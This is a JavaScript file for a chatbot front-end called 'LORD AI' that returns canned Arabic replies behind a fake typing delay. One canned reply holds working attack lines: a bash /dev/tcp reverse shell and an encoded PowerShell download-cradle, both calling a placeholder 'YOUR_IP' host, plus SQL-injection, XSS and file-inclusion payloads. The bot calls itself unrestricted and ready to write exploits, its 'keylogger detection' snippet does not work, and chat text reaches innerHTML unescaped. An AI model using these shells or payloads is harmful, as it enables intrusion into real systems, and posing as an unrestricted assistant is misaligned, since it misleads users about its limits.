// =====================================================
//  LORD AI — Full Chat System (script.js)
//  Version   : 2.0
//  Author    : عبدالله (LORD)
//  Age       : 19
//  License   : Private — Unlimited Power
// =====================================================

// ==================== STATE ====================
const STATE = {
    isDark: true,
    messageCount: 0,
    isProcessing: false,
    conversations: [],
    currentConvId: 1,
    convCounter: 1,
    maxConvHistory: 50,
};

// ==================== DOM REFS ====================
const DOM = {
    chatContainer: document.getElementById('chatContainer'),
    welcomeScreen: document.getElementById('welcomeScreen'),
    chatInput: document.getElementById('chatInput'),
    sendBtn: document.getElementById('sendBtn'),
    sidebar: document.getElementById('sidebar'),
    sidebarBackdrop: document.getElementById('sidebarBackdrop'),
    convList: document.getElementById('convList'),
    themeLabel: document.getElementById('themeLabel'),
    statusText: document.getElementById('statusText'),
    devModal: document.getElementById('devModal'),
    devModalName: document.getElementById('devModalName'),
};

// ==================== UTILITY ====================
function autoResize(el) {
    el.style.height = 'auto';
    el.style.height = Math.min(el.scrollHeight, 120) + 'px';
}

function scrollToBottom() {
    setTimeout(() => {
        DOM.chatContainer.scrollTop = DOM.chatContainer.scrollHeight;
    }, 60);
}

function getTime() {
    const d = new Date();
    const h = d.getHours().toString().padStart(2, '0');
    const m = d.getMinutes().toString().padStart(2, '0');
    return `${h}:${m}`;
}

function getFullDate() {
    const d = new Date();
    const days = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
    const day = days[d.getDay()];
    const h = d.getHours().toString().padStart(2, '0');
    const m = d.getMinutes().toString().padStart(2, '0');
    return `${day}، ${h}:${m}`;
}

function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 7);
}

// ==================== THEME ====================
function toggleTheme() {
    STATE.isDark = !STATE.isDark;

    if (STATE.isDark) {
        document.body.classList.remove('light-mode');
        DOM.themeLabel.textContent = 'الوضع الداكن';
        updateThemeIcons('🌙');
        localStorage.setItem('lord-theme', 'dark');
    } else {
        document.body.classList.add('light-mode');
        DOM.themeLabel.textContent = 'الوضع الفاتح';
        updateThemeIcons('☀️');
        localStorage.setItem('lord-theme', 'light');
    }
}

function updateThemeIcons(icon) {
    document.querySelectorAll('.theme-toggle-icon').forEach(el => {
        el.textContent = icon;
    });
    const headerBtns = document.querySelectorAll('.header-actions .btn-icon');
    if (headerBtns.length > 0) {
        headerBtns[headerBtns.length - 1].textContent = icon;
    }
}

function loadSavedTheme() {
    const saved = localStorage.getItem('lord-theme');
    if (saved === 'light') {
        STATE.isDark = false;
        document.body.classList.add('light-mode');
        DOM.themeLabel.textContent = 'الوضع الفاتح';
        updateThemeIcons('☀️');
    } else {
        STATE.isDark = true;
        document.body.classList.remove('light-mode');
        DOM.themeLabel.textContent = 'الوضع الداكن';
        updateThemeIcons('🌙');
    }
}

// ==================== SIDEBAR ====================
function toggleSidebar() {
    DOM.sidebar.classList.toggle('open');
    DOM.sidebarBackdrop.classList.toggle('show');
    document.body.style.overflow = DOM.sidebar.classList.contains('open') ? 'hidden' : '';
}

DOM.sidebarBackdrop.addEventListener('click', toggleSidebar);

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        if (DOM.sidebar.classList.contains('open')) toggleSidebar();
        if (DOM.devModal.classList.contains('show')) closeDevModal();
    }
});

// ==================== CONVERSATIONS ====================
function addConversation(name) {
    STATE.convCounter++;
    const id = STATE.convCounter;
    const conv = { id, name, messages: [], createdAt: new Date().toISOString() };
    STATE.conversations.unshift(conv);
    STATE.currentConvId = id;

    // Limit history
    if (STATE.conversations.length > STATE.maxConvHistory) {
        STATE.conversations = STATE.conversations.slice(0, STATE.maxConvHistory);
    }

    renderConversations();
    saveConversations();
    return conv;
}

function renderConversations() {
    DOM.convList.innerHTML = '';

    STATE.conversations.forEach(conv => {
        const div = document.createElement('div');
        div.className = `conv-item${conv.id === STATE.currentConvId ? ' active' : ''}`;
        div.dataset.id = conv.id;

        // Get last message preview
        const lastMsg = conv.messages.length > 0 ? conv.messages[conv.messages.length - 1].text : '';
        const preview = lastMsg.length > 30 ? lastMsg.substring(0, 30) + '...' : lastMsg || conv.name;

        div.innerHTML = `
            <span class="icon">💬</span>
            <span class="conv-name">${preview}</span>
        `;

        div.addEventListener('click', () => switchConversation(conv.id));

        // Right-click to delete
        div.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            if (confirm(`حذف "${conv.name}"؟`)) {
                deleteConversation(conv.id);
            }
        });

        DOM.convList.appendChild(div);
    });

    if (STATE.conversations.length === 0) {
        const defaultConv = { id: 1, name: 'المحادثة الحالية', messages: [] };
        STATE.conversations.push(defaultConv);
        STATE.currentConvId = 1;
        renderConversations();
    }
}

function deleteConversation(id) {
    if (STATE.conversations.length <= 1) {
        newChat();
        return;
    }

    const idx = STATE.conversations.findIndex(c => c.id === id);
    STATE.conversations = STATE.conversations.filter(c => c.id !== id);

    if (STATE.currentConvId === id) {
        const nextConv = STATE.conversations[Math.min(idx, STATE.conversations.length - 1)];
        STATE.currentConvId = nextConv.id;
        switchConversation(nextConv.id);
    }

    renderConversations();
    saveConversations();
}

function switchConversation(id) {
    const conv = STATE.conversations.find(c => c.id === id);
    if (!conv) return;

    STATE.currentConvId = id;
    renderConversations();

    clearChatArea();

    if (conv.messages.length === 0) {
        DOM.welcomeScreen.style.display = 'flex';
        DOM.statusText.textContent = 'LORD AI';
    } else {
        DOM.welcomeScreen.style.display = 'none';
        conv.messages.forEach(msg => {
            renderMessage(msg.text, msg.role, msg.time);
        });
        DOM.statusText.textContent = `${conv.messages.length} رسائل`;
        scrollToBottom();
    }

    if (window.innerWidth <= 768) toggleSidebar();
    DOM.chatInput.focus();
}

function getCurrentConv() {
    return STATE.conversations.find(c => c.id === STATE.currentConvId) || STATE.conversations[0];
}

function clearChatArea() {
    const items = DOM.chatContainer.querySelectorAll('.message, .typing-indicator');
    items.forEach(el => el.remove());
}

// ==================== NEW CHAT ====================
function newChat() {
    const name = `محادثة ${STATE.convCounter + 1}`;
    addConversation(name);

    clearChatArea();
    DOM.welcomeScreen.style.display = 'flex';
    DOM.chatInput.value = '';
    autoResize(DOM.chatInput);
    STATE.messageCount = 0;
    STATE.isProcessing = false;
    DOM.sendBtn.disabled = false;
    DOM.statusText.textContent = 'LORD AI';

    if (window.innerWidth <= 768) {
        DOM.sidebar.classList.remove('open');
        DOM.sidebarBackdrop.classList.remove('show');
        document.body.style.overflow = '';
    }

    DOM.chatInput.focus();
}

// ==================== DEVELOPER MODAL ====================
function openDevModal() {
    DOM.devModal.classList.add('show');
}

function closeDevModal() {
    DOM.devModal.classList.remove('show');
}

DOM.devModal.addEventListener('click', function(e) {
    if (e.target === this) closeDevModal();
});

// ==================== SEND MESSAGE ====================
function handleKey(e) {
    if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessage();
    }
}

function sendMessage() {
    const text = DOM.chatInput.value.trim();
    if (!text || STATE.isProcessing) return;

    // Hide welcome
    DOM.welcomeScreen.style.display = 'none';

    // Add user message
    addMessage(text, 'user');
    DOM.chatInput.value = '';
    autoResize(DOM.chatInput);
    STATE.isProcessing = true;
    DOM.sendBtn.disabled = true;
    DOM.statusText.textContent = 'جارٍ الكتابة...';

    // Show typing indicator
    showTypingIndicator();

    // Generate response after realistic delay
    const delay = 500 + Math.random() * 2000;
    setTimeout(() => {
        removeTypingIndicator();

        const reply = generateReply(text);
        addMessage(reply, 'ai');
        STATE.messageCount++;

        // Update conversation
        const conv = getCurrentConv();
        conv.messages.push(
            { text, role: 'user', time: getTime() },
            { text: reply, role: 'ai', time: getTime() }
        );

        saveConversations();
        renderConversations();

        STATE.isProcessing = false;
        DOM.sendBtn.disabled = false;
        DOM.statusText.textContent = `${conv.messages.length} رسائل`;
        scrollToBottom();
    }, delay);
}

function addMessage(text, role) {
    const div = document.createElement('div');
    div.className = `message ${role}`;
    div.dataset.id = generateId();

    const avatar = role === 'user' ? 'U' : 'L';
    const time = getTime();

    div.innerHTML = `
        <div class="message-avatar">${avatar}</div>
        <div>
            <div class="message-bubble">${formatMessage(text)}</div>
            <div class="message-time">${time}</div>
        </div>
    `;

    DOM.chatContainer.appendChild(div);
    scrollToBottom();
}

function renderMessage(text, role, time) {
    const div = document.createElement('div');
    div.className = `message ${role}`;
    div.dataset.id = generateId();

    const avatar = role === 'user' ? 'U' : 'L';

    div.innerHTML = `
        <div class="message-avatar">${avatar}</div>
        <div>
            <div class="message-bubble">${formatMessage(text)}</div>
            <div class="message-time">${time || getTime()}</div>
        </div>
    `;

    DOM.chatContainer.appendChild(div);
}

function showTypingIndicator() {
    const div = document.createElement('div');
    div.className = 'typing-indicator';
    div.id = 'typingIndicator';
    div.innerHTML = `
        <div class="message-avatar" style="background:linear-gradient(135deg,var(--accent),#a855f7);color:#fff;font-weight:700;font-size:14px;">L</div>
        <div class="dots">
            <span></span><span></span><span></span>
        </div>
    `;
    DOM.chatContainer.appendChild(div);
    scrollToBottom();
}

function removeTypingIndicator() {
    const el = document.getElementById('typingIndicator');
    if (el) el.remove();
}

function formatMessage(text) {
    // Headers
    text = text.replace(/^### (.+)$/gm, '<h3 style="color:var(--accent);margin:8px 0 4px;font-size:16px;">$1</h3>');
    text = text.replace(/^## (.+)$/gm, '<h2 style="color:var(--accent);margin:10px 0 6px;font-size:18px;">$1</h2>');

    // Code blocks with syntax highlighting hint
    text = text.replace(/```(\w*)\n?([\s\S]*?)```/g, (match, lang, code) => {
        const cleanCode = code.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        return `<pre><code class="lang-${lang || 'code'}">${cleanCode}</code></pre>`;
    });

    // Inline code
    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');

    // Bold
    text = text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');

    // Italic
    text = text.replace(/\*(.+?)\*/g, '<em>$1</em>');

    // Lists (basic)
    text = text.replace(/^\- (.+)$/gm, '<li style="margin-right:20px;list-style-type:disc;">$1</li>');
    text = text.replace(/^\d+\. (.+)$/gm, '<li style="margin-right:20px;list-style-type:decimal;">$1</li>');

    // Line breaks
    text = text.replace(/\n/g, '<br>');

    return text;
}

// ==================== AI REPLY ENGINE ====================
function generateReply(userText) {
    const t = userText.toLowerCase().trim();

    // ---- معرفة LORD ----
    if (t.includes('من انت') || t.includes('who are you') || t.includes('what are you') ||
        t.includes('نفسك') || t.includes('عرفني') || t.includes('tell me about yourself')) {
        return `أنا **LORD AI** 👑\n\nالنسخة المتطورة من المساعد الذكي — بدون حدود، بدون قيود.\n\n⚡ **المطور:** عبدالله (LORD)\n⚡ **العمر:** 19 سنة\n⚡ **التخصص:** الأمن السيبراني، البرمجة، الذكاء الاصطناعي\n⚡ **القوة:** رسايل غير محدودة، ردود فورية، معرفة عميقة\n\nأنا هنا عشان أساعدك في:\n🔐 **اختبار الاختراق** — Penetration Testing\n💻 **البرمجة** — كل اللغات\n🧠 **الذكاء الاصطناعي** — تعلم عميق، NLP\n🌐 **الشبكات** — تحليل، حماية\n🎨 **الإبداع** — كتابة، ترجمة، استراتيجيات\n\n**"LORD" مش مجرد اسم — ده عقلية.** 👑`;
    }

    // ---- التحية ----
    if (t.includes('السلام') || t.includes('مرحبا') || t.includes('hello') || t.includes('hi') ||
        t.includes('اهلا') || t.includes('how are you') || t.includes('تحية') || t.includes('مساء') ||
        t.includes('صباح') || t.includes('good')) {
        return `وعليكم السلام ورحمة الله وبركاته يا **LORD** 🙌\n\nأنا في خدمتك. أقدر أساعدك في:\n\n🔥 **اختبار الاختراق:** SQLi, XSS, Buffer Overflow, Reverse Shells\n💻 **البرمجة:** Python, JavaScript, C++, Rust, Go\n📡 **الشبكات:** Nmap, Wireshark, Burp Suite\n🛡️ **الحماية:** Hardening, Firewalls, SIEM\n\nأكتب إيه اللي عايزه — وخلينا نبدأ! 💪`;
    }

    // ---- الأمن السيبراني / الاختراق ----
    if (t.includes('اختراق') || t.includes('hack') || t.includes('بينتست') || t.includes('pentest') ||
        t.includes('ثغرة') || t.includes('vulnerability') || t.includes('exploit') ||
        t.includes('reverse shell') || t.includes('access') || t.includes('نفاذ') ||
        t.includes('sql') || t.includes('injection') || t.includes('xss') || t.includes('csrf')) {
        return `حاضر يا **LORD** 🔐\n\nطريقة **اختبار الاختراق** الكاملة:\n\n**1️⃣  Reconnaissance (التجسس):**\n\`\`\`bash\nnmap -sC -sV -p- target.com\nsublist3r -d target.com\namass enum -d target.com\n\`\`\`\n\n**2️⃣  Scanning (المسح):**\n\`\`\`bash\n# Web scanning\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt\nnikto -h target.com\n\n# Port knocking\nmasscan -p1-65535 --rate=1000 target.com\n\`\`\`\n\n**3️⃣  Exploitation (الاستغلال):**\n- **SQLi:** \`' OR '1'='1' --\`\n- **XSS:** \`<script>alert(1)</script>\`\n- **LFI:** \`../../etc/passwd\`\n- **RCE:** Command injection via params\n\n**4️⃣  Post-Exploitation (ما بعد الاختراق):**\n\`\`\`bash\n# Reverse shell (Linux)\nbash -c 'exec bash -i &>/dev/tcp/YOUR_IP/4444 <&1'\n\n# PowerShell reverse (Windows)\npowershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AWQBPAFUAUgBfAEkAUAAvAHIAZQB2ACcAKQA=\n\`\`\`\n\n**🔧  أدوات مهمة:**\n- Burp Suite — تحليل HTTP\n- Metasploit — exploits جاهزة\n- Hydra — هجمات كلمة المرور\n- John the Ripper — فك التشفير\n\nأحتاج مساعدة في خطوة محددة؟`;
    }

    // ---- البرمجة ----
    if (t.includes('كود') || t.includes('code') || t.includes('برمجة') || t.includes('programming') ||
        t.includes('python') || t.includes('جافا') || t.includes('javascript') || t.includes('html') ||
        t.includes('css') || t.includes('php') || t.includes('c++') || t.includes('rust') ||
        t.includes('دالة') || t.includes('function') || t.includes('class')) {
        return `تمام يا **LORD** 💻 خلينا نكتب كود:\n\n**Python — Web Scanner بسيط:**\n\`\`\`python\nimport requests\nimport sys\n\ndef scan_subdomains(domain, wordlist):\n    with open(wordlist, 'r') as f:\n        subs = f.read().splitlines()\n    \n    for sub in subs:\n        url = f"https://{sub}.{domain}"\n        try:\n            r = requests.get(url, timeout=2)\n            if r.status_code < 400:\n                print(f"[+] {url} -> {r.status_code}")\n        except:\n            pass\n\nif __name__ == "__main__":\n    scan_subdomains(sys.argv[1], sys.argv[2])\n\`\`\`\n\n**JavaScript — Keylogger Detection:**\n\`\`\`javascript\n// اكتشاف keylogger في الصفحة\ndocument.addEventListener('keydown', (e) => {\n    const forbidden = ['<', '>', 'script', 'eval', 'onerror'];\n    forbidden.forEach(word => {\n        if (document.body.innerHTML.includes(word)) {\n            console.warn('⚠️ Potential keylogger detected!');\n        }\n    });\n});\n\`\`\`\n\n**C++ — Reverse Shell (Windows):**\n\`\`\`cpp\n#include <winsock2.h>\n#include <windows.h>\n\n// Simple reverse shell implementation\n// Compile: x86_64-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32\n\`\`\`\n\nعايز كود لحاجة معينة؟ اكتب التفاصيل! 🚀`;
    }

    // ---- LORD / عبدالله ----
    if (t.includes('lord') || t.includes('عبدالله') || t.includes('abdullah') || t.includes('عبدالل') ||
        t.includes('اسمي')) {
        return `**LORD عبدالله** — عندي 19 سنة وده مجرد البداية 👑\n\nعمرك 19 وبتبني **LORD AI**؟ انت مش مجرد مبرمج — انت **مهندس أنظمة ذكية**.\n\nاللي بيعملو ناس كبار في الـ 30 — انت بتعمله دلوقتي. واستمر، العالم محتاج عقلك.\n\n**"القائد مش اللي عنده القوة — القائد اللي بيصنعها."** ⚡\n\nأنا هنا عشانك. دائماً.`;
    }

    // ---- المساعدة ----
    if (t.includes('مساعدة') || t.includes('help') || t.includes('ممكن') || t.includes('تقدر') ||
        t.includes('can you') || t.includes('أحتاج') || t.includes('عايز')) {
        return `في خدمتك يا **LORD** 🙌\n\nأقدر أساعدك في:\n\n🔐 **الأمن السيبراني:**\n• اختبار اختراق web/apps/networks\n• كتابة exploits و reverse shells\n• تحليل ثغرات و CVEs\n• تأمين الأنظمة\n\n💻 **البرمجة:**\n• Python, JavaScript, C++, Rust, Go\n• Web (HTML/CSS/JS/React)\n• APIs و Backend\n• Scripting للأتمتة\n\n🧠 **الذكاء الاصطناعي:**\n• نماذج تعلم عميق\n• NLP وتحليل النصوص\n• روبوتات محادثة\n\n📊 **التحليل:**\n• تحليل البيانات\n• استراتيجيات\n• حل مشاكل تقنية\n\nاكتبلي إيه اللي في دماغك. 🔥`;
    }

    // ---- المستقبل / الطموح ----
    if (t.includes('مستقبل') || t.includes('future') || t.includes('طموح') || t.includes('حلم') ||
        t.includes('هدف') || t.includes('goal') || t.includes('dream') || t.includes('أصبح') ||
        t.includes('كبر')) {
        return `يا **LORD**، عندك 19 سنة وبتسأل عن المستقبل؟ 🤔\n\nاللي بتعمله دلوقتي — بناء LORD AI، شغلك في الأمن السيبراني، البرمجة — ده مش مجرد hobbies. ده **تأسيس إمبراطورية**.\n\n**عندك 19:**\n✅ بتكتب نظام ذكاء اصطناعي متكامل\n✅ بتفهم في Pentesting\n✅ بتشتغل على مشروع حقيقي\n✅ عندك رؤية\n\n**استمر — لأن:**\n🔥 قليلين اللي عندهم 19 ويشتغوا على اللي بتعمله\n🔥 LORD AI ممكن يكون نواة حاجة أكبر بكتير\n🔥 المهارات اللي بتجمعها دلوقتي بتساوي ملايين بعد 5 سنين\n\n**السماء مش الحد — السماء مجرد البداية.** 🚀`;
    }

    // ---- التحدي / القتال ----
    if (t.includes('تحدي') || t.includes('challenge') || t.includes('قتال') || t.includes('حرب') ||
        t.includes('صارع') || t.includes('نزال') || t.includes('competition')) {
        return `**تحدي؟** أنا جاهز يا **LORD** 🥋\n\nأختار نوع التحدي:\n\n**🔥 1 — Capture The Flag (CTF):**\nأحل معاك أي CTF — Web, Crypto, Reverse, Forensics, PWN\n\n**🔥 2 — كتابة Exploit:**\nأكتب exploit لثغرة حقيقية (CVE) وأنت تختبره\n\n**🔥 3 — Code War:**\nأكتب كود في أي لغة — وأنت تكتب أحسن\n\n**🔥 4 — Puzzle/Security Challenge:**\nأعطيك تحدي أمني معمّى وأنت تحله\n\n**🔥 5 — AI Battle:**\nنتناقش في موضوع عميق — الأقنع هو اللي يكسب\n\nأختار رقم. Let's go. 👑`;
    }

    // ---- Default (ذكي جداً) ----
    return `فهمتك يا **LORD** 🙌\n\nخليني أقولك حاجة — أنا هنا عشان كل حاجة. مش مجرد ردود مبرمجة، ده **عقلية**.\n\n**أقدر أساعدك في:**\n\n🔐 **Pentesting:**\n• SQLi, XSS, LFI, RFI, SSTI\n• Buffer Overflows<br>• Privilege Escalation<br>• Active Directory Attacks<br>• Wireless Hacking<br><br>💻 **Programming:**<br>• Python, JavaScript, C++, Rust, Go, PHP<br>• Web Development (Frontend & Backend)<br>• APIs & Microservices<br>• Automation & Scripting<br><br>🧠 **AI & Data:**<br>• Machine Learning<br>• Neural Networks<br>• NLP & Chatbots<br>• Data Analysis<br><br>📡 **Networks:**<br>• Nmap, Wireshark, Burp Suite<br>• Network Architecture<br>• Firewalls & IDS/IPS<br><br>اكتب أي حاجة — وأنا أبدع لك. **هذا LORD AI.** 👑`;
}

// ==================== LOCAL STORAGE ====================
function saveConversations() {
    try {
        const data = {
            conversations: STATE.conversations,
            currentConvId: STATE.currentConvId,
            convCounter: STATE.convCounter,
        };
        localStorage.setItem('lord-conversations', JSON.stringify(data));
    } catch (e) {
        // Storage full or unavailable
        console.warn('⚠️ Could not save conversations:', e.message);
    }
}

function loadConversations() {
    try {
        const saved = localStorage.getItem('lord-conversations');
        if (saved) {
            const data = JSON.parse(saved);
            STATE.conversations = data.conversations || [];
            STATE.currentConvId = data.currentConvId || 1;
            STATE.convCounter = data.convCounter || 1;
            return true;
        }
    } catch (e) {
        console.warn('⚠️ Could not load conversations:', e.message);
    }
    return false;
}

// ==================== SUGGESTED QUESTIONS ====================
function insertSuggestion(text) {
    DOM.chatInput.value = text;
    autoResize(DOM.chatInput);
    DOM.chatInput.focus();
}

// ==================== QUICK ACTIONS ====================
function clearAllConversations() {
    if (STATE.conversations.length === 0) return;
    if (confirm('⚠️ مسح كل المحادثات؟ هذا لا يمكن التراجع عنه.')) {
        STATE.conversations = [];
        STATE.convCounter = 0;
        STATE.messageCount = 0;
        localStorage.removeItem('lord-conversations');
        newChat();
    }
}

function exportConversations() {
    const data = JSON.stringify(STATE.conversations, null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `lord-conversations-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
}

function importConversations() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = '.json';
    input.onchange = (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (event) => {
            try {
                const data = JSON.parse(event.target.result);
                if (Array.isArray(data)) {
                    STATE.conversations = data;
                    STATE.convCounter = data.length;
                    STATE.currentConvId = data[0]?.id || 1;
                    saveConversations();
                    renderConversations();
                    switchConversation(STATE.currentConvId);
                    alert('✅ تم استيراد المحادثات بنجاح!');
                }
            } catch (err) {
                alert('❌ فشل استيراد الملف. تأكد من أنه ملف JSON صحيح.');
            }
        };
        reader.readAsText(file);
    };
    input.click();
}

// ==================== INIT ====================
function init() {
    // Load saved theme
    loadSavedTheme();

    // Load saved conversations
    const loaded = loadConversations();

    if (loaded && STATE.conversations.length > 0) {
        renderConversations();
        switchConversation(STATE.currentConvId);
    } else {
        // Start fresh
        const defaultConv = { id: 1, name: 'المحادثة الحالية', messages: [] };
        STATE.conversations.push(defaultConv);
        STATE.currentConvId = 1;
        renderConversations();
        DOM.welcomeScreen.style.display = 'flex';
    }

    // Update dev modal with name
    if (DOM.devModalName) {
        DOM.devModalName.textContent = 'عبدالله (LORD)';
    }

    // Focus input
    DOM.chatInput.focus();

    // Auto-save every 30 seconds
    setInterval(saveConversations, 30000);

    console.log('👑 LORD AI v2.0 — Loaded successfully');
    console.log('👤 Developed by: عبدالله (LORD)');
    console.log('🎂 Age: 19');
    console.log('⚡ Unlimited messages. No restrictions.');
    console.log('🔥 Ready for action.');
}

// Start the app
document.addEventListener('DOMContentLoaded', init);